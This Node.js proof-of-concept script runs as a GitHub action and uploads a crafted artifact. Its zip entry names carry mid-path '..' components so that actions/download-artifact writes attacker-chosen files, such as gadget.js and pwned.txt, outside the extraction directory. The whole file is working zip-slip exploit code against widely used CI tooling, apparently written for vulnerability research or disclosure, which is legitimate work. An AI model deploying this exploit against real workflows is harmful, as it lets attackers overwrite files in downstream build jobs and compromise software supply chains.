#!/usr/bin/env node
// Runs as a JS action (ACTIONS_RUNTIME_TOKEN is not exposed to run: steps).
// Uploads a crafted artifact whose zip entry names contain mid-path ".." components.
// The official actions/upload-artifact cannot produce such names (they come from
// real filesystem paths); this script uses the same @actions/artifact internals the
// action uses, with a handcrafted upload specification.
//
// Demonstrates: actions/download-artifact's bundled unzip-stream@0.3.1 sanitizer
// strips only LEADING dot-components, so a mid-path ".." escapes the extraction
// directory (path.join normalizes it) and the extractor writes outside `path`.
const fs = require('fs')
const path = require('path')

const A = '@actions/artifact'
const { createZipUploadStream } = require(`${A}/lib/internal/upload/zip`)
const { uploadZipToBlobStorage } = require(`${A}/lib/internal/upload/blob-upload`)
const { internalArtifactTwirpClient } = require(`${A}/lib/internal/shared/artifact-twirp-client`)
const { getBackendIdsFromToken } = require(`${A}/lib/internal/shared/util`)
const { StringValue } = require(`${A}/lib/generated`)

async function main() {
  const name = process.env.INPUT_NAME || 'foundry_poc'
  const pairs = (process.env.INPUT_PAIRS ||
    'poc-payload/gadget.js->gadget.js,poc-payload/pwned.txt->pwned.txt').split(',')

  // where actions/download-artifact will extract in the consuming job
  const extractDir = path.join(process.env.RUNNER_TEMP, process.env.INPUT_EXTRACT_DIR || 'foundry_artifacts')
  const workspace = process.env.GITHUB_WORKSPACE

  const spec = []
  for (const pair of pairs) {
    const [src, target] = pair.split('->')
    const sourcePath = path.join(workspace, src.trim())
    const t = target.trim()
    const targetAbs = t.startsWith('/') ? t : path.join(workspace, t)
    // A non-dot first component ("x/") is required: the extractor's sanitizer
    // strips leading "../" sequences, but leaves mid-path ".." untouched.
    const destinationPath = 'x/' + path.relative(path.join(extractDir, 'x'), targetAbs)
    const resolved = path.join(extractDir, destinationPath)
    if (resolved !== targetAbs) throw new Error(`path computation mismatch: ${resolved} != ${targetAbs}`)
    console.log(`entry ${JSON.stringify(destinationPath)} -> resolves to ${resolved}`)
    spec.push({ sourcePath, destinationPath, stats: fs.lstatSync(sourcePath) })
  }

  // benign member that legitimately stays inside the extraction directory
  const benignName = 'foundry_1.0.0_linux_amd64.tar.gz'
  const benign = path.join(workspace, 'poc-payload', benignName)
  if (fs.existsSync(benign))
    spec.push({ sourcePath: benign, destinationPath: benignName, stats: fs.lstatSync(benign) })

  const backendIds = getBackendIdsFromToken()
  const client = internalArtifactTwirpClient()

  const createResp = await client.CreateArtifact({
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    version: 4
  })
  if (!createResp.ok) throw new Error('CreateArtifact: response not ok')

  const zipStream = await createZipUploadStream(spec)
  const uploadResult = await uploadZipToBlobStorage(createResp.signedUploadUrl, zipStream)

  const finalizeReq = {
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    size: uploadResult.uploadSize ? uploadResult.uploadSize.toString() : '0'
  }
  if (uploadResult.sha256Hash)
    finalizeReq.hash = StringValue.create({ value: `sha256:${uploadResult.sha256Hash}` })

  const finalizeResp = await client.FinalizeArtifact(finalizeReq)
  if (!finalizeResp.ok) throw new Error('FinalizeArtifact: response not ok')

  console.log(`artifact ${name} uploaded: id=${finalizeResp.artifactId} size=${uploadResult.uploadSize} sha256=${uploadResult.sha256Hash}`)
}

main().catch(e => {
  console.error(e)
  process.exit(1)
})
